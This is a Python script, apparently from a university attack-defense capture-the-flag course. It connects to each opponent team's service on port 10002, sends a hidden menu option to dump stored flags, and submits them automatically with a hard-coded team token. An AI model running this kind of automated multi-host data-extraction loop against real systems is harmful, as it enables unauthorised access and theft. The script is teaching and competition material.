#Author - Hemendu Roy

from swpag_client import Team
import requests
import json
import pwn

pwn.context.arch = 'amd64'


t = Team("http://actf0.cse545.io/", "wttkkxI8K2CxqTz2HRpW")
'''
t.get_targets(2)
#t.submit_flag(["FLG07oHDPj3HVQlV"])

data=t.get_targets(2)
with open('data.json', 'w') as outfile:
    json.dump(data, outfile)
f = open('data.json',)
data = json.load(f)
#print(data)


for i,j in zip(data[0],data[1]):
    print(i)
    print(j)
'''
teamlist=[]
for i in range(1,44):
    if i==39:
        continue
    teamlist.append("team"+str(i))
print(teamlist)

for team in teamlist:
    p=pwn.remote(team,'10002')
    try:
        p.recvuntil('(1-3): ')
        p.sendline('4')
    
        p.recvline()
        p.recvline()
        p.recvline() #"Anyway, what's the baby ID?"
    
        p.sendline('\n')
    
        flag=[]
    
        while True:
            p.recvuntil('FLG')
            fflag=p.recv(13)
            fflag="FLG" + fflag
            flag.append(fflag)
            print(fflag)
            t.submit_flag([fflag])
    except EOFError as error:
        continue
#print("flag is : " + flag)
#flag="FLG" + flag
#print("real flag is : " + flag)
